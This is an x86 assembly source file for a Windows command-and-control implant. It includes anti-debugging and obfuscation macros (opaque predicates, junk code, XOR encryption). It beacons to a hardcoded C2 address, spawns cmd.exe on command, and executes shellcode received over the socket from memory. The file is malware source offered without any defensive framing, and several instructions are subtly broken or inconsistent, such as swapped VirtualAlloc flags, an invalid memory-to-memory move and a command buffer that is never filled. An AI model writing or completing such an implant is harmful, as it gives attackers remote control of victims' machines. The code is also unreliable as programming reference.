%macro CHECK_ERROR 1
test eax, eax
jnz %1
%endmacro

%macro XOR_ENCRYPT 3
; XOR_ENCRYPT dest, length, key
mov esi, %1 ; Pointer to message
mov ecx, %2 ; Length of message
mov al, %3 ; Load XOR key
.encrypt_loop_%1: ; Unique loop label based on parameter
xor byte [esi], al ; XOR the byte
inc esi ; Move to next byte
loop .encrypt_loop_%1 ; Repeat for the message length
%endmacro

%macro JUMP_OBFUSCATE 2
; JUMP_OBFUSCATE label_true, label_false
xor eax, eax
mov eax, 1
cmp eax, 1
jz %1 ; Jump to true label
jmp %2 ; Jump to false label
%endmacro

%macro INSERT_NOP 1
; Inserts NOPs for padding
times %1 db 0x90 ; NOP instruction
%endmacro

%macro MODIFY_CODE 1
; Modify code at the given address
mov byte [%1], 0x90 ; Change instruction to NOP for confusion
%endmacro

%macro RANDOMIZE_INSTRUCTIONS 1
; Generates random instructions for metamorphism
mov eax, 1
ror eax, %1 ; Rotate right for variation
add eax, 2
sub eax, 1
%endmacro

section .data
c2_ip db '192.168.1.117', 0 ; C2 server IP
c2_port dw 2222 ; C2 server port
sleep_duration dd 60 ; Sleep duration (in seconds)
beacon_msg db 'Beacon', 0 ; Message to send
beacon_msg_len equ $ - beacon_msg ; Length of beacon message
xor_key db 0xAA ; XOR key for encryption
error_msg db 'Error occurred.', 0 ; Generic error message
cmd_exit db 'exit', 0 ; Command to exit
cmd_shell db 'cmd.exe', 0 ; Command shell executable
payload_size dd 512 ; Size of the payload

section .bss
sockfd resd 1 ; Socket file descriptor
server_addr resb 16 ; Socket address structure
recv_buf resb 1024 ; Buffer for incoming data
cmd_buf resb 512 ; Buffer for command
shellcode resb 512 ; Buffer for shellcode
junk_code resb 512 ; Buffer for junk instructions
self_code_offset resd 1 ; Placeholder for self-modification example
payload resb 512 ; Placeholder for dynamic payload

section .text
global main
extern ExitProcess
extern IsDebuggerPresent
extern socket
extern connect
extern recv
extern send
extern Sleep
extern VirtualAlloc
extern RtlMoveMemory
extern CreateRemoteThread
extern CloseSocket
extern WinExec
extern CreateProcessA
extern GetProcAddress
extern LoadLibraryA

main:
; Initial Debugger Check
call IsDebuggerPresent
CHECK_ERROR debugger_detected ; If debugging is detected, jump

; Opaque Predicate
JUMP_OBFUSCATE skip_junk, junk_code_1

; Junk Code for Confusion
junk_code_1:
mov ebx, 1
INSERT_NOP 3 ; Insert 3 NOPs
RANDOMIZE_INSTRUCTIONS 5 ; Randomize instructions
xor ebx, ebx ; Reset for confusion
add ebx, 3
sub ebx, 1
skip_junk:

; Create Socket
mov eax, 2 ; AF_INET
mov ebx, 1 ; SOCK_STREAM
mov ecx, 0 ; IPPROTO_IP
push ecx
push ebx
push eax
call socket
CHECK_ERROR connect_error ; Jump if socket creation fails
mov [sockfd], eax

; Setup Server Address Structure
mov dword [server_addr], 0x0100007F
mov word [server_addr + 12], [c2_port]
mov word [server_addr + 2], 2

; Connect to the C2 Server
push 16
push server_addr
push [sockfd]
call connect
CHECK_ERROR connect_error

; Send a Beacon Message
mov eax, [sockfd]
mov ecx, beacon_msg
mov edx, beacon_msg_len
XOR_ENCRYPT ecx, edx, xor_key ; Encrypt the message
push edx
push ecx
push eax
call send
cmp eax, -1
je send_error

; Receive Command
push 1024
push recv_buf
push [sockfd]
call recv
cmp eax, 0
jle close_socket

; Decrypt the Received Command
XOR_ENCRYPT recv_buf, eax, xor_key

; Execute Command
call execute_command
jmp beacon_loop ; Continue beaconing

debugger_detected:
push error_msg
call ExitProcess

connect_error:
invoke ExitProcess, 0

send_error:
invoke ExitProcess, 0

execute_command:
; Check if command is to exit
cmp dword [cmd_buf], cmd_exit
je exit_agent

; Execute Shell Command
cmp dword [cmd_buf], cmd_shell
je spawn_shell

; Load additional dynamic payload
call load_dynamic_payload
jmp execute_dynamic_payload

spawn_shell:
; Start a command shell
push 0
push cmd_shell
push 0
push 1
call CreateProcessA
ret

exit_agent:
invoke ExitProcess, 0
ret

beacon_loop:
; Sleep before next beacon
mov eax, [sleep_duration]
push eax
call Sleep

; Send Beacon again
mov eax, [sockfd]
mov ecx, beacon_msg
mov edx, beacon_msg_len
XOR_ENCRYPT ecx, edx, xor_key ; Encrypt the message
push edx
push ecx
push eax
call send
cmp eax, -1
je send_error

; Receive Command
push 1024
push recv_buf
push [sockfd]
call recv
cmp eax, 0
jle close_socket

; Decrypt Command
XOR_ENCRYPT recv_buf, eax, xor_key

; Reflective In-Memory Shellcode Execution
call load_shellcode
jmp beacon_loop ; Repeat beaconing indefinitely

load_shellcode:
; Allocate memory for shellcode
mov eax, 0x1000 ; PAGE_EXECUTE_READWRITE permissions
mov ebx, 0x40 ; MEM_COMMIT
mov ecx, shellcode ; Target memory for shellcode
push eax
push ebx
push ecx
call VirtualAlloc
CHECK_ERROR memory_alloc_error

; Copy shellcode to allocated memory
mov eax, shellcode
mov ebx, recv_buf
mov ecx, 512 ; Assume max 512 bytes of shellcode
call RtlMoveMemory

; Execute shellcode with opaque control flow
call execute_shellcode
ret

execute_shellcode:
; Opaque predicate rigging
xor eax, eax ; Obfuscation
mov eax, 1
cmp eax, 1
jz skip_junk_code
jmp junk_code_continued

skip_junk_code:
; Execute shellcode
mov eax, shellcode ; Address of shellcode
call eax ; Jump to shellcode start
ret

junk_code_continued:
; Additional confusing junk code
RANDOMIZE_INSTRUCTIONS 5 ; More randomization
add eax, 2
sub eax, 1
jmp short skip_junk_code ; Adding another jump for confusion
ret

memory_alloc_error:
; Handle memory allocation failure gracefully
push error_msg
call ExitProcess

close_socket:
; Close the socket connection
mov eax, [sockfd]
push eax
call CloseSocket
jmp beacon_loop

load_dynamic_payload:
; Generate a dynamic payload based on input or environment
; This is a placeholder for dynamic payload generation logic
; In a real scenario, you would have algorithms to create unique payloads
mov eax, payload
; Populate payload buffer with some data or instructions
mov byte [eax], 0xCC ; INT 3 for testing (breakpoint)
ret

execute_dynamic_payload:
; Execute the dynamically generated payload
mov eax, payload
call eax ; Call the payload

; Loop back for further execution
jmp beacon_loop ; Continue the beacon loop

section .rsrc
; Resource section could be used to embed additional data if needed

